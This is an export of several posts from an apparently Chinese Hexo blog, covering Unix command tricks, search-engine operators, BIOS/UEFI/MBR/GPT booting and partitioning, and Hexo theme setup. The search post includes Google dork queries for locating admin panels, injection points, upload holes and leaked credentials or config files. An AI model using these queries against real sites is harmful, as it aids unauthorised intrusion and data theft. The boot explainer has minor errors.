<h1 id="创建目录树"><a href="#创建目录树" class="headerlink" title="创建目录树"></a>创建目录树</h1><p>用<code>mkdir</code>加上-p选项创建一个目录树，用<code>&#123;&#125;</code>创建多个目录(中间用<code>,</code>隔开)<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir -p ~&#x2F;jail&#x2F;&#123;dev,bin,sbin,etc,usr,lib,lib64&#125;&#x2F;&#123;test1,test2&#125;</span><br><span class="line"></span><br><span class="line">tree ~&#x2F;jail&#x2F;</span><br></pre></td></tr></table></figure></p>
<h1 id="将文件复制到多个目录中"><a href="#将文件复制到多个目录中" class="headerlink" title="将文件复制到多个目录中"></a>将文件复制到多个目录中</h1><p>原始操作<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp &#x2F;path&#x2F;to&#x2F;file &#x2F;usr&#x2F;dir1 </span><br><span class="line">cp &#x2F;path&#x2F;to&#x2F;file &#x2F;var&#x2F;dir2 </span><br><span class="line">cp &#x2F;path&#x2F;to&#x2F;file &#x2F;nas&#x2F;dir3 </span><br></pre></td></tr></table></figure></p>
<p>高效操作<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#x2F;usr&#x2F;dir1 &#x2F;var&#x2F;dir2 &#x2F;nas&#x2F;dir3 | xargs -n 1 cp -v &#x2F;path&#x2F;to&#x2F;file </span><br></pre></td></tr></table></figure></p>
<h1 id="快速找出两个目录的不同"><a href="#快速找出两个目录的不同" class="headerlink" title="快速找出两个目录的不同"></a>快速找出两个目录的不同</h1><p><code>diff</code>命令会按行比较文件。但是它也可以比较两个目录<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -l &#x2F;tmp&#x2F;r </span><br><span class="line"></span><br><span class="line">ls -l &#x2F;tmp&#x2F;s </span><br><span class="line"></span><br><span class="line"># 使用 diff 比较两个文件夹 </span><br><span class="line"></span><br><span class="line">diff &#x2F;tmp&#x2F;r&#x2F; &#x2F;tmp&#x2F;s&#x2F; </span><br></pre></td></tr></table></figure></p>
<h1 id="文本格式化"><a href="#文本格式化" class="headerlink" title="文本格式化"></a>文本格式化</h1><p>可以用 <code>fmt</code> 命令重新格式化每个段落。分割超长的行并且填充短行<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fmt file.txt </span><br></pre></td></tr></table></figure><br>也可以分割长的行，但是不重新填充，也就是说分割长行，但是不填充短行<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fmt -s file.txt </span><br></pre></td></tr></table></figure></p>
<h1 id="可以看见输出并将其写入到一个文件中"><a href="#可以看见输出并将其写入到一个文件中" class="headerlink" title="可以看见输出并将其写入到一个文件中"></a>可以看见输出并将其写入到一个文件中</h1><p>使用 <code>tee</code> 命令在屏幕上看见输出并同样写入到日志文件my.log中：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mycoolapp arg1 arg2 input.file | tee my.log </span><br></pre></td></tr></table></figure><br>tee可以保证同时在屏幕上看到<code>mycoolapp</code>的输出并写入文件  my.log。</p>
<p>原文：<a href="http://www.cyberciti.biz/open-source/command-line-hacks/20-unix-command-line-tricks-part-i/">http://www.cyberciti.biz/open-source/command-line-hacks/20-unix-command-line-tricks-part-i/</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>高效搜索</title>
    <url>/2019/10/14/%E9%AB%98%E6%95%88%E6%90%9C%E7%B4%A2/</url>
    <content><![CDATA[<h1 id="搜索的艺术"><a href="#搜索的艺术" class="headerlink" title="搜索的艺术"></a>搜索的艺术</h1><p>  在平时使用搜索引擎的过程中，通常是将需要搜索的关键字输入搜索引擎，然后就开始了漫长的信息提取过程。其实搜索引擎对关键字提供了多种语法，合理使用这些语法，将使我们得到的搜索结果更加精确。各个搜索引擎的语法都是大致一样的，只有少部分语法不同或被禁止的。</p>
<a id="more"></a>
<h1 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h1><ul>
<li><p><strong><code>site:</code></strong>         限制搜索范围的域名</p>
</li>
<li><p><strong><code>inurl:</code></strong>         用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用</p>
</li>
<li><p><strong><code>intext:</code></strong>     只搜索网页<code>&lt;body&gt;</code>部分中包含的文字(忽略标题、URL等的文字)</p>
</li>
<li><p><strong><code>intitle:</code></strong>     查包含关键词的页面，一般用于社工别人的webshell密码</p>
</li>
<li><p><strong><code>filetype:</code></strong>     搜索文件的后缀或者扩展名</p>
</li>
<li><p><strong><code>intitle:</code></strong>     限制你搜索的网页标题</p>
</li>
<li><p><strong><code>link:</code></strong>         可以得到一个所有包含了某个指定URL的页面列表</p>
</li>
<li><p><strong><code>Site:</code></strong>         找到与指定网站有联系的URL。例如输入“Site:www.sunghost.cn”。所有和这个网站有联系的URL都会被显示</p>
</li>
<li><p><strong><code>cache:</code></strong>         搜索google里关于某些内容的缓存，有时候也许能找到一些好东西</p>
</li>
<li><p><strong><code>define:</code></strong>     搜索某个词语的定义。搜索：define：hacker，将返回关于hacker的定义</p>
</li>
<li><p><strong><code>info:</code></strong>         查找指定站点的一些基本信息</p>
</li>
</ul>
<h1 id="GoogleHacking语法"><a href="#GoogleHacking语法" class="headerlink" title="GoogleHacking语法"></a>GoogleHacking语法</h1><ul>
<li><p>查找后台地址：<code>site:域名 inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms</code></p>
</li>
<li><p>查找文本内容：<code>site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username</code></p>
</li>
<li><p>查找可注入点：<code>site:域名 inurl:aspx|jsp|php|asp</code></p>
</li>
<li><p>查找上传漏洞：<code>site:域名 inurl:file|load|editor|Files</code></p>
</li>
<li><p>找eweb编辑器：<code>site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit</code></p>
</li>
<li><p>存在的数据库：<code>site:域名 filetype:mdb|asp|#</code></p>
</li>
<li><p>查看脚本类型：<code>site:域名 filetype:asp/aspx/php/jsp</code></p>
</li>
<li><p>迂回策略入侵：<code>inurl:cms/data/templates/images/index/</code></p>
</li>
<li><p>各种敏感数据收集：</p>
<ul>
<li><p><code>filetyle:xls inurl:gov username password</code></p>
</li>
<li><p><code>inurl:phpmyadmin/main.php intitle:phpmyadmin</code></p>
</li>
<li><p><code>filetype:inc inurl:config.inc host</code></p>
</li>
<li><p><code>filetype:sql cdb_members inurl:forumdata</code></p>
</li>
<li><p><code>filetype:txt inurl:&quot;新建文本文档.txt&quot;密码</code></p>
</li>
<li><p><code>inurl:phpinfo.php intitle:&quot;phpinfo()&quot;&quot;PHP Version&quot;+&quot;Server API&quot;</code></p>
</li>
<li><p><code>filetype:log inurl:log mdb</code></p>
</li>
</ul>
</li>
</ul>
]]></content>
      <tags>
        <tag>GoogleHacking</tag>
        <tag>搜索</tag>
        <tag>高效</tag>
      </tags>
  </entry>
  <entry>
    <title>BIOS、UEFI、MBR、GPT都是啥呢</title>
    <url>/2019/12/06/BIOS%E3%80%81UEFI%E3%80%81MBR%E3%80%81GPT%E9%83%BD%E6%98%AF%E5%95%A5%E5%91%A2/</url>
    <content><![CDATA[<p>装系统时难免会接触到BIOS、UEFI、MBR、GPT等概念，一下子有些混淆不清，本文就这些概念进行总结</p>
<a id="more"></a>
<h1 id="启动模式"><a href="#启动模式" class="headerlink" title="启动模式"></a>启动模式</h1><p>BIOS(<code>Basic Input/Output System</code>)是存储在BIOS芯片中的程序，现在的新式电脑用的基本都是UEFI(<code>Unified Extensible Firmware Interface</code>)（基本见于09年以后的主板），早期的过渡电脑用的都是EFI启动。EFI或UEFI的一部分是存储在EFI/UEFI BIOS芯片。EFI/UEFI也叫做EFI/UEFI  BIOS，但在实际上它们和BIOS是不一样的，所以一般把后面的“BIOS”尾巴去掉，下面就来具体谈一下BIOS、EFI和UEFI。</p>
<h2 id="BIOS"><a href="#BIOS" class="headerlink" title="BIOS"></a>BIOS</h2><p><strong>BIOS只认识设备，不认识分区、不认识文件</strong></p>
<font color="ff0000">BIOS启动的时候，按照CMOS设置里的顺序，挨个查存储设备的前512字节，若是以0x55 0xAA结尾，则这个磁盘可以启动，加载这512字节里的代码并执行,执行后事几乎就跟BIOS关系了，若不是，那就跳过找下一个设备。</font>



<blockquote>
<p>这512字节里存了决定启动什么系统的相应代码。这个代码是系统安装程序写进去的，目的是启动自身系统。512字节还包含了MBR分区表的信息，而BIOS并不认识分区表，所以就算是磁盘上没有分区表也没有分区，只要前512字节有0x55 0xAA的结尾，有引导代码，也是能启动系统</p>
<p>BIOS本身是汇编语言代码，是在16位实模式下调用INT  13H中断执行的，16位实模式直接能访问的内存只有1MB，就算装了4G、8G或者16G还是32G内存，到了BIOS上一律只先认前1MB。在这1MB内存中，前640K称为基本内存，后面384K内存留给开机必要硬件和各类BIOS本身使用</p>
</blockquote>
<p>BIOS用于计算机硬件自检和初始化、CMOS设置、引导操作系统启动、提供硬件I/O、硬件中断等主要功能</p>
<p><a href="#bios">BIOS启动计算机的具体过程</a></p>
<h2 id="UEFI"><a href="#UEFI" class="headerlink" title="UEFI"></a>UEFI</h2><h3 id="EFI"><a href="#EFI" class="headerlink" title="EFI"></a>EFI</h3><p>  <strong>EFI（Extensible Firmware  Interface，可扩展固件接口）</strong>，是用模块化、高级语言（主要是C语言）构建的一个小型化系统，和BIOS一样，<strong>主要在启动过程中完成硬件初始化</strong>，但它是直接利用加载EFI驱动的方式，识别系统硬件并完成硬件初始化，彻底摒弃读各种中断执行。EFI驱动并不是直接面向CPU的代码，而是由EFI字节码编写成，EFI字节码是专用于EFI的虚拟机器指令，需要在EFI驱动运行环境DXE下解释运行，这样EFI既可以实现通配，又提供了良好的兼容，因此<strong>与BIOS不同的是CMOS设置程序在EFI上是作为一个个EFI程序来执行的，硬件设置是硬件设置程序、而启动管理则是另一个程序，保存CMOS又是另一个程序</strong>。此外，<strong>EFI完全是32位或64位，摒弃16位实模式，在EFI中就可以实现处理器的最大寻址</strong>，因此可以在任何内存地址存放任何信息。</p>
<p>  EFI在功能上完全等同于一个轻量化的OS（操作系统），但EFI在制定时就定位到不足以成为专业OS的地位上，它只是一个硬件和操作系统间的一个接口；不提供中断访问机制，EFI必须用轮询的方式检查并解释硬件，较OS下的驱动执行效率较低；EFI只有简单的存储器管理机制，在段保护模式下只将存储器分段，所有程序都可以存取任何一段位置，不提供真实的保护服务。伴随着EFI，一种全新的GUID磁盘分区系统（GPT）被引入支持。</p>
<p>在EFI发展到1.1的时候，英特尔把EFI公之于众，后续的2.0吸引了众多公司加入，EFI也不再属于英特尔，而是属于了Unified EFI  Form的国际组织，EFI在2.0后也改称为UEFI，EFI和原来是一个意思，U则是Unified（一元化、统一）的缩写，所以UEFI的意思就是“统一的可扩展固件接口”</p>
<h3 id="UEFI-1"><a href="#UEFI-1" class="headerlink" title="UEFI"></a>UEFI</h3><p><strong>UEFI认识设备，还认识设备ROM，还认识分区表、认识文件系统以及文件</strong></p>
<p>UEFI启动的时候，经过一系列初始化，然后按照设置的顺序，找启动项。启动项分设备启动项和文件启动项两种：</p>
<ul>
<li>文件启动项，大概记录的是某磁盘的某分区的某路径下的某个文件。对于文件启动项，固件会直接加载这个EFI文件，并执行，文件不存在则失败。</li>
<li>设备启动项，大概记录的是某U盘、某硬盘等设备启动项，且UEFI标准规定了其默认的路径<code>\EFI\Boot\bootX64.efi</code>。UEFI会加载磁盘上的这个文件，文件不存在则失败。</li>
</ul>
<font color="ff0000">UEFI启动后，进入DXE（Driver eXecution Environment，驱动程序执行环境）阶段，开始加载设备驱动，然后获得设备列表。对于磁盘，UEFI会加载对应的驱动解析其中的分区表（GPT和MBR）。然后UEFI就会用内置的文件系统驱动，解析每个分区从中认识出启动文件，比如`\EFI\Boot\bootX64.efi` </font>

<p><a href="#uefi">UEFI启动计算机的具体过程</a></p>
<blockquote>
<p> UEFI标准里，在GPT分区表的基础上，规定了一个EFI系统分区（EFI System Partition，ESP），ESP要格式化成FAT32，EFI启动文件要放在“\EFI\&lt;厂商&gt;”文件夹下面</p>
<p>作为UEFI标准里，钦定的文件系统，FAT32.efi是每个主板都会带的。所有UEFI的主板都认识FAT32分区</p>
<p>BIOS只能在16位模式下运行，而UEFI可以在32位或64位模式下运行，具有比BIOS更多的可寻址地址空间</p>
<p>UEFI还包含了其他功能，它支持安全引导（SecureBoot），开启后，主板会验证即将加载的efi文件的签名，如果是不是受信任的，就会拒绝加载，以确保没有恶意软件篡改引导过程</p>
</blockquote>
<p>磁盘分区要格式化之后才能存文件，格式化成不同的文件系统，文件才能被不同的操作系统识别<br>如Win10可以选FAT32、NTFS、exFAT、ReFS等；Linux可以选ext2、ext3、ext4、FAT32等；macOS可以选FAT32、HFS+、APFS、exFAT等</p>
<p>其实每个操作系统都带有文件系统驱动才能读取文件系统中的文件<br>比如Windows带了FAT32、NTFS、exFAT、ReFS四种文件系统等驱动，Linux带了FAT32、ext等文件系统等驱动，macOS带了FAT32、HFS+、APFS、exFAT四种驱动以及NTFS只读驱动。<br>设备也是一样的。<br>原版的WinXP只带了IDE驱动，没有SATA驱动；原版Win7只带了IDE和SATA驱动，没带NVMe驱动；Win8/Win10则带了IDE/SATA和NVMe三种驱动；macOS10.12带了SATA驱动以及苹果专用NVMe磁盘的驱动；macOS10.13带了SATA和标准NVMe驱动。</p>
<p>UEFI模糊了固件和操作系统界限，设计之初就考虑到了扩展性，也是有驱动程序的。启动过程中的DXE阶段加载驱动用的</p>
<h2 id="UEFI和BIOS比较。"><a href="#UEFI和BIOS比较。" class="headerlink" title="UEFI和BIOS比较。"></a>UEFI和BIOS比较。</h2><p>二者显著的区别就是EFI是用模块化，C语言风格的参数堆栈传递方式，动态链接的形式构建的系统，较BIOS而言更易于实现，容错和纠错特性更强，缩短了系统研发的时间。<br>| BIOS                                                         | UEFI                                                         |<br>| —————————————————————————————— | —————————————————————————————— |<br>| 16位实模式下运行，只有1M的寻址空间                           | 运行于32位或64位模式,具有更多的可寻址地址空间                |<br>| BIOS利用挂载真实模式中断的方式增加硬件功能                   | 将一段类似于驱动的16位代码，放置在固定的0x000C0000至0x000DFFFF之间存储区中，运行这段代码的初始化部分，它将挂载实模式下约定的中断矢量向其他程序提供服务 |<br>| BIOS提供的服务在现实中只能提供给操作系统引导程序或MS-DOS类操作系统使用 | 具有良好的向下兼容性和被外部访问的特性                       |<br>| 不支持secure boot                                            | 支持secure boot                                              |</p>
<h1 id="磁盘分区"><a href="#磁盘分区" class="headerlink" title="磁盘分区"></a>磁盘分区</h1><p>直接比较，需要细细了解的可以继续看，不想细细了读完彩色部分大概知道有什么不同就行，直接跳过前两小节即可。</p>
<p><strong><font color="008000">传统MBR磁盘最多有4个主分区（或3个主分区，1个扩展分区和无限制的逻辑驱动器），MBR硬盘分区最大仅支持2T容量。</font></strong></p>
<p><strong><font color="ff0000">GPT磁盘分区样式支持最大为128个分割，一个分割最大18 EB，只受到操作系统限制（由于分区表本身需要占用一定空间，最初规划硬盘分区时，留给分区表的空间决定了最多可以有多少个分区，IA-64版Windows限制最多有128个分区，这也是EFI标准规定的分区表的最小尺寸）。</font></strong> 与MBR分区的磁盘不同，至关重要的平台操作数据位于分区，而不是位于非分区或隐藏扇区。另外，GPT分区磁盘有备份分区表来提高分区数据结构的完整性。在UEFI系统上，通常是通过ESP分区中的EFI应用程序文件引导GPT硬盘上的操作系统，而不是活动主分区上的引导程序。 </p>
<h2 id="MBR-Master-Boot-Record-主引导记录"><a href="#MBR-Master-Boot-Record-主引导记录" class="headerlink" title="MBR(Master Boot Record,主引导记录)"></a>MBR(Master Boot Record,主引导记录)</h2><p><strong>主引导记录（Master Boot Record，MBR）</strong>，又叫做主引导扇区，是计算机开机后访问硬盘时所必须要读取的首个扇区，它在硬盘上的三维地址为（柱面，磁头，扇区）＝（0，0，1）。有时将其开头的446字节内容特指为“主引导记录”（MBR），其后是4个16字节的“磁盘分区表”（DPT），以及2字节的结束标志（55AA）。因此，在使用“主引导记录”（MBR）这个术语的时候，需要根据具体情况判断其到底是指整个主引导扇区，还是主引导扇区的前446字节。 </p>
<p><strong>主引导记录</strong>最开头是第一阶段引导代码。其中的硬盘引导程序的主要作用是检查分区表是否正确并且在系统硬件完成自检以后将控制权交给硬盘上的引导程序（如GNU GRUB）。它不依赖任何操作系统，而且启动代码也是可以改变的，从而能够实现多系统引导。</p>
<p><strong>DPT(Disk Partition Table,硬盘分区表 )</strong>占据主引导扇区的64个字节（偏移01BEH—偏移01FDH），可以对四个分区的信息进行描述，其中每个分区的信息占据16个字节。</p>
<p><strong>结束标志字</strong>55，AA（偏移1FEH－偏移1FFH）最后两个字节，是检验主引导记录是否有效的标志</p>
<p>主引导扇区记录着硬盘本身的相关信息以及硬盘各个分区的大小及位置信息，是数据信息的重要入口。如果它受到破坏，硬盘上的基本数据结构信息将会丢失，需要用繁琐的方式试探性的重建数据结构信息后才可能重新访问原先的数据。主引导扇区内的信息可以通过任何一种基于某种操作系统的分区工具软件写入，但和某种操作系统没有特定的关系，即只要创建了有效的主引导记录就可以引导任意一种操作系统。</p>
<p><strong>主引导记录仅仅包含一个64个字节的硬盘分区表</strong>。由于每个分区信息需要16个字节，所以对于采用MBR型分区结构的硬盘，<strong>最多只能识别4个主要分区</strong>（Primary partition）。所以对于一个采用此种分区结构的硬盘来说，想要得到4个以上的主要分区是不可能的。从而引出了扩展分区。扩展分区也是主要分区的一种，但它与主分区的不同在于<strong>理论上可以划分为无数个逻辑分区。</strong></p>
<p>扩展分区中逻辑驱动器的引导记录是链式的。每一个逻辑分区都有一个和MBR结构类似的<strong>扩展引导记录</strong>（EBR），其分区表的第一项指向该逻辑分区本身的引导扇区，第二项指向下一个逻辑驱动器的EBR，分区表第三、第四项没有用到。 </p>
<ul>
<li><p>Windows系统默认情况下，一般都是只划分一个主分区给系统，剩余的部分全部划入扩展分区。 </p>
</li>
<li><p>在MBR分区表中最多4个主分区或者3个主分区＋1个扩展分区，也就是说扩展分区只能有一个，然后可以再细分为多个逻辑分区。</p>
</li>
<li>在Linux系统中，硬盘分区命名为sda1－sda4或者hda1－hda4（其中a表示硬盘编号可能是a、b、c等等）。在MBR硬盘中，分区号1－4是主分区（或者扩展分区），逻辑分区号只能从5开始。</li>
<li>在MBR分区表中，一个分区最大的容量为2T，且每个分区的起始柱面必须在这个硬盘的前2T内。有一个3T的硬盘，根据要求至少要划分为2个分区，且最后一个分区的起始扇区要位于硬盘的前2T空间内。如果硬盘太大则必须改用GPT。</li>
</ul>
<h2 id="GPT-GUID-Partition-Table-全局唯一标识分区表"><a href="#GPT-GUID-Partition-Table-全局唯一标识分区表" class="headerlink" title="GPT(GUID Partition Table,全局唯一标识分区表)"></a>GPT(GUID Partition Table,全局唯一标识分区表)</h2><p><strong>全局唯一标识分区表（GUID Partition Table，GPT）</strong>是一个实体硬盘的分区表的结构布局的标准。它是可扩展固件接口（UEFI）标准（被Intel用于替代个人计算机的BIOS）的一部分，被用于替代BIOS系统中的一32bits来存储逻辑块地址和大小信息的主引导记录（MBR）分区表。对于那些扇区为512字节的磁盘，MBR分区表不支持容量大于2.2TB的分区，然而，一些硬盘制造商（诸如希捷和西部数据）注意到这个局限性，并且将他们的容量较大的磁盘升级到4KB的扇区，这意味着MBR的有效容量上限提升到16 TiB。 </p>
<p>在MBR硬盘中，分区信息直接存储于主引导记录（MBR）中（主引导记录中还存储着系统的引导程序）。但在GPT硬盘中，分区表的位置信息储存在GPT头中。但出于兼容性考虑，硬盘的第一个扇区仍然用作MBR，之后才是GPT头。</p>
<p>主引导记录最开头是第一阶段引导代码。其中的硬盘引导程序的主要作用是检查分区表是否正确并且在系统硬件完成自检以后将控制权交给硬盘上的引导程序（如GNU GRUB）。它不依赖任何操作系统，而且启动代码也是可以改变的，从而能够实现多系统引导。</p>
<h3 id="传统MBR"><a href="#传统MBR" class="headerlink" title="传统MBR"></a>传统MBR</h3><p>在GPT分区表的最开头，出于兼容性考虑仍然存储了一份传统的MBR，用来防止不支持GPT的硬盘管理工具错误识别并破坏硬盘中的数据，这个MBR也叫做保护MBR。在支持从GPT启动的操作系统中，这里也用于存储第一阶段的启动代码。在这个MBR中，只有一个标识为0xEE的分区，以此来表示这块硬盘使用GPT分区表。不能识别GPT硬盘的操作系统通常会识别出一个未知类型的分区，并且拒绝对硬盘进行操作，除非用户特别要求删除这个分区。这就避免了意外删除分区的危险。另外，能够识别GPT分区表的操作系统会检查保护MBR中的分区表，如果分区类型不是0xEE或者MBR分区表中有多个项，也会拒绝对硬盘进行操作。</p>
<p>在使用MBR/GPT混合分区表的硬盘中，这部分存储了GPT分区表的一部分分区（通常是前四个分区），可以使不支持从GPT启动的操作系统从这个MBR启动，启动后只能操作MBR分区表中的分区。</p>
<h3 id="分区表头"><a href="#分区表头" class="headerlink" title="分区表头"></a>分区表头</h3><p>分区表头定义了硬盘的可用空间以及组成分区表的项的大小和数量。分区表头还记录了这块硬盘的GUID，记录了分区表头本身的位置(LBA 1)和大小以及备份分区表头和分区表的位置(硬盘的最后)和大小。还储存着它本身和分区表的CRC32校验。固件、引导程序和操作系统在启动时可以根据这个校验值来判断分区表是否出错，如果出错了，可以使用软件从硬盘最后的备份GPT中恢复整个分区表，如果备份GPT也校验错误，硬盘将不可使用。所以GPT硬盘的分区表不可以直接使用16进制编辑器修改</p>
<h3 id="分区表项"><a href="#分区表项" class="headerlink" title="分区表项"></a>分区表项</h3><p>GPT分区表使用简单而直接的方式表示分区。一个分区表项的前16字节是分区类型GUID(如，EFI系统分区的GUID类型是:<code>`C12A7328-F81F-11D2-BA4B-00A0C93EC93B</code>)。接下来的16字节是该分区唯一的GUID（这个GUID指的是该分区本身，而之前的GUID指的是该分区的类型）。再接下来是分区起始和末尾的64位LBA编号，以及分区的名字和属性。 </p>
<h3 id="操作系统支持"><a href="#操作系统支持" class="headerlink" title="操作系统支持"></a>操作系统支持</h3><ul>
<li><p>现在几乎所以类Unix操作系统如FreeBSD、Linux、MacOS等都有读写支持和启动支持</p>
</li>
<li><p>Windows：</p>
</li>
</ul>
<blockquote>
<p>1：读写支持</p>
<p>2：启动支持</p>
<p>3：启动支持(需要UEFI)</p>
<p>4：在MBR/GPT混合硬盘中优先使用MBR</p>
</blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th>XP</th>
<th>2003</th>
<th>vista</th>
<th>2008</th>
<th>7</th>
<th>2012</th>
<th>8</th>
<th>8.1</th>
<th>10</th>
<th>2016</th>
</tr>
</thead>
<tbody>
<tr>
<td>32位</td>
<td></td>
<td>1(SP1)</td>
<td>1/4</td>
<td>1/4</td>
<td>1/4</td>
<td>-</td>
<td>1/3/4</td>
<td>1/3/4</td>
<td>1/3/4</td>
<td>-</td>
</tr>
<tr>
<td>64位</td>
<td>1/4</td>
<td>1/2/3/4</td>
<td>1/3/4</td>
<td>1/2/3/4</td>
<td>1/3/4</td>
<td>1/3/4</td>
<td>1/3/4</td>
<td>1/3/4</td>
<td>13/4</td>
<td>1/3/4</td>
</tr>
</tbody>
</table>
</div>
<p>注意：64位2003在x64平台为<code>3</code>，在IA-64平台上为<code>2</code>；64位2008在x64平台上为<code>3</code>，在IA-64平台上为<code>2</code></p>
<h1 id="计算机启动过程"><a href="#计算机启动过程" class="headerlink" title="计算机启动过程"></a>计算机启动过程</h1><h2 id="BIOS启动计算机的过程"><a href="#BIOS启动计算机的过程" class="headerlink" title="BIOS启动计算机的过程"></a><span id="bios">BIOS启动计算机的过程</span></h2><p>  当按下电源，主板等设备开始供电，这时电压还不稳定。在早期的南北桥主板上，由主板北桥向CPU发复位信号，对CPU初始化；稳定电压后复位信号便撤掉。现在的单南桥主板，则由CPU自身调整稳定电压达到初始化的目的，当电压稳定后，CPU便在系统BIOS保留的内存地址处执行跳转BIOS起始处指令，开始执行POST自检。</p>
<p>  在POST自检中，BIOS只检查系统的必要核心硬件(CPU、640K基本内存、显卡)是否有问题，PS/2键盘控制器、系统时钟是否有错误等等。由于POST检查在显卡初始化以前，因此在这个阶段如发生错误，无法在屏幕上显示，不过主板上有个报警扬声器，如果主板的8255外围可编程接口芯片没有损坏的话，POST报警声音一定是会出来的。一般情况下，一声短“嘀”声基本代表正常启动，不同的错误则是不同的短“嘀”声和长“嘀”声组合。POST自检结束后，BIOS开始调用中断完成各种硬件初始化工作。</p>
<p>  硬件初始化工作主要有两点，首先POST检测后，电脑出现了开机启动画面，这就是已经检测到了显卡并完成了初始化，但由于BIOS是在16位实模式运行，因此画面是以VGA分辨率（640*480，纵横比4:3）显示的。第二，BIOS只识别到由主引导记录（MBR）初始化的硬盘，而EFI或UEFI采用了一种新的GUID磁盘分区系统（GPT）格式，这种硬盘在BIOS下是无法识别的。硬件全部初始化完毕后进入更新ESCD阶段。</p>
<p>  在ESCD更新阶段中，BIOS将对存储在CMOS中和操作系统交换的硬件配置数据进行检测，如果系统硬件发生变动，则会更新该数据，否则不更新保持原状不变，ESCD检测或更新结束后，BIOS将完成最后一项工作，就是启动操作系统。</p>
<p>  最后这一步中，BIOS根据CMOS中用户指定的硬件启动顺序，读取相应设备的启动或引导记录，引导相应设备上的操作系统启动，进入操作系统，此后便由操作系统接替BIOS负责硬件和软件间的相互通信。如果发现所有硬件都没有能引导操作系统的记录，则会在屏幕上显示相应错误信息，并将电脑维持在16位实模式。</p>
<h2 id="UEFI启动计算机的过程"><a href="#UEFI启动计算机的过程" class="headerlink" title="UEFI启动计算机的过程"></a><span id="uefi">UEFI启动计算机的过程</span></h2><p>打开电源开关时，电脑的主要部件都开始有了供电，与BIOS不同的是，UEFI预加载环境首先开始执行，负责CPU和内存（全部容量）的初始化工作，这里如出现重要问题，电脑即使有报警喇叭也不会响，因为UEFI没有去驱动8255发声，不过预加载环境只检查CPU和内存，如果这两个主要硬件出问题，屏幕没显示可以立即确定，另外一些主板会有提供LED提示，可根据CPU或内存亮灯大致判断故障。</p>
<p>CPU和内存初始化成功后，DXE（Driver eXecution Environment，驱动程序执行环境）载入，当DXE载入后，UEFI就具有了枚举并加载UEFI驱动程序的能力，在此阶段，UEFI会枚举搜索各个硬件的UEFI驱动并相继加载，完成硬件初始化工作，这相比BIOS的读中断加载速度会快的多，同样如加载显卡的UEFI驱动成功，电脑也会出现启动画面，硬件驱动全部加载完毕后，最后同BIOS一样，也得去启动操作系统。</p>
<p>在启动操作系统的阶段，同样是根据启动记录的启动顺序，转到相应设备（仅限GPT设备，如果启动传统MBR设备，则需要打开CSM支持）的引导记录，引导操作系统并进入，注意，UEFI在检测到无任何操作系统启动设备时，会直接进入UEFI设置页面，而不是像BIOS那样黑屏显示相关信息。</p>
<h2 id="概括："><a href="#概括：" class="headerlink" title="概括："></a>概括：</h2><ul>
<li><p>BIOS先要对CPU初始化，然后跳转到BIOS启动处进行POST自检，此过程如有严重错误，则电脑会用不同的报警声音提醒，接下来采用读中断的方式加载各种硬件，完成硬件初始化后进入操作系统启动过程</p>
</li>
<li><p>而UEFI则是运行预加载环境先直接初始化CPU和内存，CPU和内存若有问题则直接黑屏，其后启动PXE采用枚举方式搜索各种硬件并加载驱动，完成硬件初始化，之后同样进入操作系统启动过程</p>
</li>
</ul>
<h1 id="参考，扩展"><a href="#参考，扩展" class="headerlink" title="参考，扩展"></a>参考，扩展</h1><p><a href="https://zhuanlan.zhihu.com/p/54108702">电脑基础知识普及：BIOS、EFI与UEFI详解</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/31365115">科普贴：BIOS和UEFI的启动项</a></p>
<p><a href="https://www.tony-yin.site/2019/01/10/Talk_BIOS_UEFI_MBR_GPT_GRUB/#GRUB%E4%BD%8D%E7%BD%AE">聊聊 BIOS、UEFI、MBR、GPT、GRUB…… </a></p>
<p><a href="https://en.wikipedia.org/wiki/Partition_table">分区表</a></p>
]]></content>
      <tags>
        <tag>BIOS</tag>
        <tag>UEFI</tag>
        <tag>MBR</tag>
        <tag>GPT</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo主题更新美化</title>
    <url>/2020/12/12/Hexo%E4%B8%BB%E9%A2%98%E6%9B%B4%E6%96%B0%E7%BE%8E%E5%8C%96/</url>
    <content><![CDATA[<h1 id="Hexo-next-主题配置美化"><a href="#Hexo-next-主题配置美化" class="headerlink" title="Hexo next 主题配置美化"></a>Hexo next 主题配置美化</h1><p> <strong>在博客根目录下操作</strong></p>
<h2 id="下载使用next主题"><a href="#下载使用next主题" class="headerlink" title="下载使用next主题"></a>下载使用next主题</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br><span class="line">vim _config.yml		<span class="comment">#修改配置使用主题</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">theme:next</span></span><br></pre></td></tr></table></figure>
<p><strong>官方不建议直接修改主题文件下的内容，这不利于升级</strong><br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">cp themes/next/_config.yml _config.next.yml  <span class="comment"># 复制主题文件到主目录</span></span><br></pre></td></tr></table></figure></p>
<p>Hexo 配置文件(<code>$blog/_config.yml</code>)中的 <code>theme_config</code> 的优先级最高，其次是 <code>$blog/_config.[theme].yml</code> 文件，最后是位于主题目录下的 <code>_config.yml</code> 文件</p>
<a id="more"></a>
<h2 id="博客配置文件基础配置"><a href="#博客配置文件基础配置" class="headerlink" title="博客配置文件基础配置"></a>博客配置文件基础配置</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config</span><br></pre></td></tr></table></figure>
